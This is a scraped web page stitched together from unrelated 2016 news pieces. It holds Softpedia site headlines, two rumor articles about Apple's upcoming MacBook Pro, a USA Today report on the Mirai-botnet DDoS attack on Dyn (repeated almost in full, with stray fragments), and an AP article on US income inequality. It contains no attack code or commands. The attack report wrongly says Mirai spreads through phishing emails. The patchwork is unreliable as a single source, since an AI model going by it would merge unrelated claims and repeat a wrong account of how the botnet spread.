375.10 Beta Linux Graphics Driver Released with GeForce GTX 1050 Support Deus Ex: Mankind Divided Is Coming to Linux on November 3, Ported by Feral Microsoft Pledges to Completely Retire Office 2007 Next Year Firefox 50.0 Officially Released for Linux, Mac and Windows, Here's What's New Some U.S. Android Phones Have Secret Backdoor That Sends Data to China Apple Insider Says iPhone 6 Plus Has a Major Bug, Company Should Start Recall X.Org Server 1.19.0 Officially Released, Coming Soon to a Linux Distro Near You Total War: WARHAMMER Is Coming to Linux, SteamOS, and Mac on November 22, 2016 Vendetta Online 1.8.396 MMORPG Released for Linux, Mac, Windows, and Android 4MLinux 21.0 Operating System Enters Development, First Beta Ready for Testing    GParted Live 0.27.0-1 released New Linux Apps Linux Kernel: What you are about to download is the core of all the Linux operating systems in the world Linux Kernel: The core of the Linux operating systems, created and maintained by Linus Torvalds Tor Browser: Browse the web anonymously with the custom and private web browser from the Tor project KDE Frameworks: This project contains all the KDE libraries and code base for KDE applications and platform darktable: Your personal virtual lighttable and darkroom, photography workflow & RAW management application LFA (Linux For All): A 64-bit only Linux-based operating system that features four desktop environments Vivaldi: The next-generation web browser for power users, based on the powerful Chromium project Reader comments AMD Rolls Out AMDGPU-PRO 16.40 Driver for Ubuntu and Red Hat Enterprise Linux more on: AMDGPU-PRO 16.40 i softpedia®     Like 202K    +1 56K     Follow 13K © 2001-2016 Softpedia.

Thankfully, we won’t have to endure Apple’s stale and stagnant Mac lineup for much longer. Earlier this week, Apple sent out invitations for a special media event set to take place on October 27. Apple, in typical fashion, hasn’t told us what’s on the agenda but it’s no secret that the event will focus primarily on new Macs. It’s also no secret that the star of the show will be a completely retooled MacBook Pro with a number of snazzy new bells and whistles. DON’T MISS: Google’s new Pixel XL is no match for iPhone 7 Plus in one key area If you’ve been in the market for a new Mac, you certainly won’t want to miss next week’s event. And to get you primed for what will hopefully be some compelling new products, we’ve put together a list highlighting everything we know about Apple’s upcoming MacBook Pro. First things first, the killer feature on Apple’s 2016 MacBook Pro will reportedly be the addition of an OLED display panel located towards the top of the keyboard. Rather than expanding the existing keyboard, it’s believed that the OLED panel will be located where the function keys typically reside. This past May, photos purporting to be from Apple’s new MacBook Pro leaked online and, surprise surprise, note the empty space where the function row keys usually are. As to the inherent advantages of such a design, an OLED display on the keyboard would allow the keys to dynamically change to more appropriately fit whatever app you happen to be using. As an illustrative example, designer Martin Hajek earlier this year produced a number of tantalizing concept images which showcase how the feature might operate. The images below, for example, show what the OLED display might look like with Spotify running. These are just concepts, remember, but the possibilities of an OLED display offering up app-specific shortcuts is certainly compelling. All the more intriguing are reports that users will have the ability to customize app-specific shortcuts to their liking. Late this August, the French site Consomac unearthed code from Apple’s Pages app which strongly hints that the shortcuts on the OLED display — which Apple internally calls the Dynamic Function Row — can be tweaked by users. Imagine, for example, selecting a block of text and with the tap of a button instantly formatting it to your liking without having to go sifting through a maze of menus. We would imagine that Apple will have more appealing examples to show us come next Thursday. Another intriguing detail about Apple’s forthcoming MacBook Pro models is that they will have Touch ID integrated into the keyboard itself. This should be particularly useful given that users running Mac OS Sierra can now take advantage of Apple Pay on the web. As for other details, Apple’s new MacBook Pro will reportedly be a little bit thinner than its predecessor, will feature a larger trackpad, and will include a keyboard based on the butterfly mechanism Apple first introduced us to with the 12-inch MacBook. If this particular rumor pans out, expect the keys on the new MacBook Pro to have a slightly larger surface area. Apple touts the benefits of its butterfly mechanism thusly: Traditional keyboards use a scissor mechanism, which tends to wobble around the edges. This creates a lack of precision when you strike anywhere except the center of the key. We needed to reduce key wobbling for a keyboard this thin; otherwise, striking a key off-center could result in the keycap hitting bottom before a keystroke registers. So we designed a unique butterfly mechanism, which is wider than the scissor mechanism and has a single assembly made from a stiffer material — allowing for a more stable, responsive key that takes up less vertical space. This innovative design improves stability, uniformity, and control — no matter where you press on the key. Additionally, don’t be surprised if the trackpad on the new MacBook Pro is completely stationary a’la Apple’s current 12-inch MacBook. As far as ports are concerned, consumers can likely kiss the beloved MagSafe adapter and traditional USB ports goodbye and instead say hello to new USB-C and Thuderbolt 3 ports. While Apple may very well just include one USB-C port, one would imagine that Apple would outfit its Pro notebook with more than just USB-C port. With respect to internals, we can naturally expect to see some great speed and graphics improvements. Specifically, the new MacBook Pros will reportedly house Intel Skylake processors which should make the machines much more power efficient, a welcome perk on a Pro device that will likely be used as a workhorse by many. On the graphics front, don’t be surprised to see a GPU which takes advantage of AMD’s Polaris architecture. Size wise, Apple will reportedly release two MacBook Pro models, one in a 13-inch form factor and another in a 15-inch form factor. While there was some concern that Apple might do away with the headphone jack on its new MacBook Pros, the leaked chasis below should help alleviate any concerns in that regard.   Last and not least, expect to see Apple’s revamped MacBook Pro hit store shelves in 2016, presumably before the busy holiday shopping season kicks off.

Home Church & Ministries U.S. World Politics Entertainment living Opinion MacBook Pro 2016 Release Date, Latest Rumors: MacBook Pro on Event, OLED Display Panel, Butterfly Keyboard By Neal A. Lasta Oct 22, 2016 | 12:50 PM Apple fans are eagerly anticipating the latest version of the MacBook Pro. Many are in agreement that the MacBook Pro needs a high order revamp and that a 2016 version is much needed. Because of this, there have been rumors about the MacBook Pro 2016 its specs, features and release date over the past couple of months. Fortunately, there have been news from the Cupertino-based company itself that may indicate the MacBook Pro 2016 will be introduced very soon. Apple has officially sent invitations to its October 27 event. Although many people already know that the event will most likely occur, this time it's truly official. New MacBook Pro on Event Apple, like always, didn't reveal what the agenda for the event is, but the invitations offered clues that point to a MacBook Pro 2016. For example, the title of the event is "hello again," which, theoretically, could mean we're going to see the MacBook Pro again, which hasn't received any key update for the longest time. Yes, I want Breaking Christian News Submit New Features: OLED Display Panel If rumors and reports are true, then one of the most anticipated features of the MacBook Pro 2016 is the OLED display panel which can be found above the keyboard. This doesn't mean that the keyboard size will be expanded due to another panel; rather, the OLED panel will replace where the function keys used to be. There have been leaked photos, such as the ones found here, that show this OLED display panel may be more than just a rumor. In a couple of these photos, one can see that there is an empty space where the function keys are located in a standard keyboard. The OLED display panel is said to offer various types of functions depending on what app is running. For example, if your MacBook Pro 2016 is running Spotify, then the play, back and forward symbols along with the volume bar may appear on the panel. Another leak shows code that indicates the shortcuts that appear in the OLED display panel can be customized by the users. Specs: Butterfly Mechanism Keyboard Other reports indicate that the new MacBook Pro will be much thinner than the previous version. It will also have a bigger trackpad. It will also have a butterfly mechanism-based keyboard. This butterfly mechanism isn't new to Apple keyboards; in fact, it was introduced in the 12-inch version of the MacBook. The MacBook Pro 2016 is also rumored to have USB-C ports, Thunderbolt 3 ports, and much improved performance and speed. The speed and performance upgrades are due to the addition of Intel Skylake processors, AMD Polaris and many more. Previous rumors indicate that the MacBook Pro 2016 will no longer have the headphone jack. But there are leaked images that show that this is not the case; perhaps this is good news to many Apple MacBook users. These are just some of the rumored specs and features of the MacBook Pro 2016 which may be introduced on October 27. While we can only speculate, the actual event is only a few days away, and Apple fans are excited about what the company has to offer next.

USA TODAY A map showing areas of Internet outages the morning of Friday, October 21, 2016. At the time, a distributed denial of service attack on Dyn, an Internet and DNS service provider was underway by unknown sources. The map was created by DownDetector, a company that tracks such outages. (Photo: DownDetector) SAN FRANCISCO — Eleven hours after a massive online attack that blocked access to many popular websites, the company under assault has finally restored its service. Dyn, a New Hampshire-based company that monitors and routes Internet traffic, was the victim of a massive attack that began at 7:10 a.m. ET Friday morning. The issue kept some users on the East Coast from accessing Twitter, Spotify, Netflix, Amazon, Tumblr, Reddit, PayPal and other sites. At 6:17 p.m. ET Friday, Dyn updated its website to say it had resolved the large-scale distributed denial of service attack (DDoS) and service had been restored. DDoS attacks flood servers with so many fake requests for information that they cannot respond to real ones, often crashing under the barrage. It's unclear who orchestrated the attack. “It’s a very smart attack. We start to mitigate, they react. It keeps on happening every time. We’re learning though,” said Kyle York, Dyn’s chief strategy officer said on a conference call with reporters Friday afternoon. Troubling to security experts was that the attackers relied on Mirai, an easy-to-use program that allows even unskilled hackers to take over online devices and use them to launch DDoS attacks. The software uses malware from phishing emails to first infect a computer or home network, then spreads to everything on it, taking over DVRs, cable set-top boxes, routers and even Internet-connected cameras used by stores and businesses for surveillance. These devices are in turn used to create a robot network, or botnet, to send the millions of messages that knocks the out victims' computer systems. The source code for Mirai was released on the so-called dark web, sites that operate as a sort of online underground for hackers, at the beginning of the month. The release led some security experts to suggest it would soon be widely used by hackers. That appears to have happened in this case. USA TODAY Internet of Things comes back to bite us as hackers spread botnet code Dyn is getting “tens of millions” of messages from around the globe sent by seemingly harmless but Internet-connected devices. “It could be your DVR, it could be a CCTV camera, a thermostat. I even saw an Internet-connected toaster on Kickstarter yesterday,"  said York. The complexity and breadth of the multiple attack points makes it difficult to fight, because it's hard to distinguish legitimate traffic from botnet traffic. York said one bright spot for the company had been the tremendous outpouring of aid from its customers, competitors and law enforcement. “You guys wouldn’t believe the amount of support we’ve received,” he told reporters. Effects felt nationwide Dyn first  posted on its website at 7:10 a.m. ET that it "began monitoring and mitigating a DDoS attack against our Dyn Managed DNS infrastructure." These resolved towards 9:30 a.m.. Then more waves began. "It's been a hectic day," said York. The attack comes at a time of heightened public sensitivity and concern that the nation's institutions and infrastructure could face large-scale hacking attacks. The most recent example has been the release of emails stolen from the servers of the Democratic National Committee, which U.S. intelligence sources say was the work of Russia. The topic has come up frequently during the fall's hard-fought presidential campaign. White House Press Secretary Josh Earnest said the Department of Homeland Security was “monitoring the situation" but that “at this point I don’t have any information about who may be responsible for this malicious activity.” So far Dyn has not been able to ascertain whether the attack is aimed at any specific customer. “We have no reason to believe it is at this point,” said Dave Allen, the company’s general counsel. The attack is “consistent with record-setting sized cyberattacks seen in the last few weeks,” said Carl Herberger, vice president of security at security company Radware. Disruption A post on Hacker News first identified the attack and named the sites that were affected. Several sites, including Spotify and GitHub, took to Twitter Friday morning to post status updates once the social network was back online. Uh oh, we’re having some issues right now and investigating. We’ll keep you updated!— Spotify Status (@SpotifyStatus) October 21, 2016 Twitter users similarly took to the service to keep lists of which sites were down and comment on the situation. The term DDoS quickly vaulted to among the top of the site's list of "Trending Topics" in the United States. DDoS attack this morning takes out Reddit, Twitter & Spotify.

"If you go to a site, say yahoo.com, your browser needs to know what the underlying Internet address that’s associated with that URL is. DNS is the service that does that conversion,”  said Steve Grobman, chief technology officer for Intel Security. The attack hit the Dyn server that contains that address book, a service Dyn provides to multiple Internet companies. For anyone attempting to link to a site that used the Dyn service, when they entered an address such as twitter.com or tumblr.com it was unable to link them to the proper numerical IP address, so to their computer it appeared the site was unavailable.

Income inequality has surged near levels last seen before the Great Depression. The average income for the top 1 percent of households climbed 7.7 percent last year to $1.36 million, according to tax data tracked by Emmanuel Saez, an economics professor at the University of California, Berkeley. That privileged sliver of the population saw pay climb at almost twice the rate of income growth for the other 99 percent, whose pay averaged a humble $48,768. But why care how much the wealthy are making? What counts the most to any family is how much that family is bringing in. And that goes to the heart of the income-inequality debate: Most Americans still have yet to recover from the Great Recession, even though that downturn ended seven years ago. The average income for the 99 percent is still lower than it was back in 1998 after adjusting for inflation. FILE - In this May 4, 2016, file photo, Duncan Wallace drives a golf cart from his house to his golf club as a group of landscape workers take a break in Vista, Calif. Income inequality has surged near levels last seen before the Great Depression. The average income for the top 1 percent of households climbed 7.7 percent last year to $1.36 million, according to tax data. That privileged sliver of the population saw pay climb at almost twice the rate of income growth for the other 99 percent, whose pay averaged a humble $48,768. (AP Photo/Gregory Bull, File) Meanwhile, incomes for the executives, bankers, hedge fund managers, entertainers and doctors who make up the top 1 percent have steadily improved. These one-percenters account for roughly 22 percent of all personal income, more than double the post-World War II era level of roughly 10 percent. One reason the income disparity is troubling for the nation is that it's thinning out the ranks of the middle class. ___ WHERE THEY STAND Hillary Clinton has highlighted inequality in multiple speeches, with her positions evolving somewhat over the past year. Bernie Sanders held her feet to the fire on that subject in the primaries. Clinton hopes to redirect more money to the middle class and impoverished. Clinton would raise taxes on the wealthy, increase the federal minimum wage, boost infrastructure spending, provide universal pre-K and offer the prospect of tuition-free college. Donald Trump offers a blunter message about a hollowed-out middle class and a system "rigged" against average Americans. Still, he has yet to emphasize income inequality in the campaign. To bring back the factory jobs long associated with the rise of the middle class, Trump has promised new trade deals and infrastructure spending. But Trump has also proposed a tax plan that would allow the wealthiest Americans to keep more of their earnings. ___ WHY IT MATTERS President Barack Obama has called rising inequality "the defining challenge of our time." And experts warn that it may be slowing overall economic growth. Greater inequality has created a festering distrust of government and of corporate leaders whose promises of better times ahead never fully materialized. The result has been a backlash against globalization that many Americans feel tilted the economy against them. For the top 1 percent, the ability to move money overseas and reach markets worldwide concentrated pay for "superstars," according to economists. At the same time, factory workers now compete with 3 billion people in China, India, Eastern Europe and elsewhere who weren't working for multinational corporations 20 years ago. Many now make products for Apple, Intel, General Motors and others at low wages. This has depressed middle-class pay. These trends have contributed to a "hollowed out" labor market in the United States, with more jobs at the higher and lower ends of the pay scale and fewer in the middle.

USA TODAY A map showing areas of Internet outages the morning of Friday, October 21, 2016. At the time, a distributed denial of service attack on Dyn, an Internet and DNS service provider was underway by unknown sources. The map was created by DownDetector, a company that tracks such outages. (Photo: DownDetector) SAN FRANCISCO — Eleven hours after a massive online attack that blocked access to many popular websites, the company under assault has finally restored its service. Dyn, a New Hampshire-based company that monitors and routes Internet traffic, was the victim of a massive attack that began at 7:10 a.m. ET Friday morning. The issue kept some users on the East Coast from accessing Twitter, Spotify, Netflix, Amazon, Tumblr, Reddit, PayPal and other sites. At 6:17 p.m. ET Friday, Dyn updated its website to say it had resolved the large-scale distributed denial of service attack (DDoS) and service had been restored. DDoS attacks flood servers with so many fake requests for information that they cannot respond to real ones, often crashing under the barrage. It's unclear who orchestrated the attack. “It’s a very smart attack. We start to mitigate, they react. It keeps on happening every time. We’re learning though,” said Kyle York, Dyn’s chief strategy officer said on a conference call with reporters Friday afternoon. Troubling to security experts was that the attackers relied on Mirai, an easy-to-use program that allows even unskilled hackers to take over online devices and use them to launch DDoS attacks. The software uses malware from phishing emails to first infect a computer or home network, then spreads to everything on it, taking over DVRs, cable set-top boxes, routers and even Internet-connected cameras used by stores and businesses for surveillance. These devices are in turn used to create a robot network, or botnet, to send the millions of messages that knocks the out victims' computer systems. The source code for Mirai was released on the so-called dark web, sites that operate as a sort of online underground for hackers, at the beginning of the month. The release led some security experts to suggest it would soon be widely used by hackers. That appears to have happened in this case. USA TODAY Internet of Things comes back to bite us as hackers spread botnet code Dyn is getting “tens of millions” of messages from around the globe sent by seemingly harmless but Internet-connected devices. “It could be your DVR, it could be a CCTV camera, a thermostat. I even saw an Internet-connected toaster on Kickstarter yesterday,"  said York. The complexity and breadth of the multiple attack points makes it difficult to fight, because it's hard to distinguish legitimate traffic from botnet traffic. York said one bright spot for the company had been the tremendous outpouring of aid from its customers, competitors and law enforcement. “You guys wouldn’t believe the amount of support we’ve received,” he told reporters. Effects felt nationwide Dyn first  posted on its website at 7:10 a.m. ET that it "began monitoring and mitigating a DDoS attack against our Dyn Managed DNS infrastructure." These resolved towards 9:30 a.m.. Then more waves began. "It's been a hectic day," said York. The attack comes at a time of heightened public sensitivity and concern that the nation's institutions and infrastructure could face large-scale hacking attacks. The most recent example has been the release of emails stolen from the servers of the Democratic National Committee, which U.S. intelligence sources say was the work of Russia. The topic has come up frequently during the fall's hard-fought presidential campaign. White House Press Secretary Josh Earnest said the Department of Homeland Security was “monitoring the situation" but that “at this point I don’t have any information about who may be responsible for this malicious activity.” So far Dyn has not been able to ascertain whether the attack is aimed at any specific customer. “We have no reason to believe it is at this point,” said Dave Allen, the company’s general counsel. The attack is “consistent with record-setting sized cyberattacks seen in the last few weeks,” said Carl Herberger, vice president of security at security company Radware. Disruption A post on Hacker News first identified the attack and named the sites that were affected. Several sites, including Spotify and GitHub, took to Twitter Friday morning to post status updates once the social network was back online. Uh oh, we’re having some issues right now and investigating. We’ll keep you updated!— Spotify Status (@SpotifyStatus) October 21, 2016 Twitter users similarly took to the service to keep lists of which sites were down and comment on the situation. The term DDoS quickly vaulted to among the top of the site's list of "Trending Topics" in the United States. DDoS attack this morning takes out Reddit, Twitter & Spotify.

Anyone else having a whole lot of trouble with sites loading properly this morning? Paypal is down, Twitter was down, Netflix half loading.— Emmy Caitlin (@emmycaitlin) October 21, 2016 "Anyone else having a whole lot of trouble with sites loading properly this morning?," tweeted Emmy Caitlin. "Paypal is down, Twitter was down, Netflix half loading." Looks like Twitter is down again.....now 1 billion people won't know what I had for breakfast.— Ben duPont (@BenjaminduPont) October 21, 2016 Websites that went down b/c of this morning's DDoS attack include: • Twitter • SoundCloud • Spotify • Netflix • Reddit • Disqus • PayPal— NUFF$AID (@nuffsaidNY) October 21, 2016 How the attack works As part of its business, Dyn provides DNS services for a given swath of the Internet, effectively its address book. DNS stands for Domain Name System, the decentralized network of files that link the domain names human beings use, such as usatoday.com, with their numeric Internet Protocol addresses, such as 184.50.238.11, which is how computers look for websites. "If you go to a site, say yahoo.com, your browser needs to know what the underlying Internet address that’s associated with that URL is. DNS is the service that does that conversion,”  said Steve Grobman, chief technology officer for Intel Security. The attack hit the Dyn server that contains that address book, a service Dyn provides to multiple Internet companies. For anyone attempting to link to a site that used the Dyn service, when they entered an address such as twitter.com or tumblr.com it was unable to link them to the proper numerical IP address, so to their computer it appeared the site was unavailable. DDoS attacks flood servers with millions of illegitimate requests, so many that very few real requests can get through, or get through only intermittently.
